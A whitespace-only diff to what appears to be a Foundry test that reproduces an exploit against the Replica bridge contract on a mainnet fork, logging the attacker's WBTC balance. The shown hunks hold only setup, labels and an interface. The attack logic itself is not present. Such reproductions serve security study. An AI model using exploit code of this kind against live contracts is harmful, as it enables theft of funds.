@@ -33,6 +33,7 @@ IReplica constant Replica = IReplica(0x5D94309E5a0090b165FA4181519701637B6DAEBA)
 IERC20 constant WBTC = IERC20(0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599);
 
 contract Attacker is Test {
+
     function setUp() public {
         cheat.createSelectFork("mainnet", 15_259_100);
         cheat.label(address(Replica), "Replica");
@@ -81,8 +82,11 @@ contract Attacker is Test {
 
         emit log_named_decimal_uint("Attacker WBTC Balance", WBTC.balanceOf(address(this)), 8);
     }
+
 }
 
 interface IReplica {
+
     function process(bytes memory _message) external returns (bool _success);
+
 }
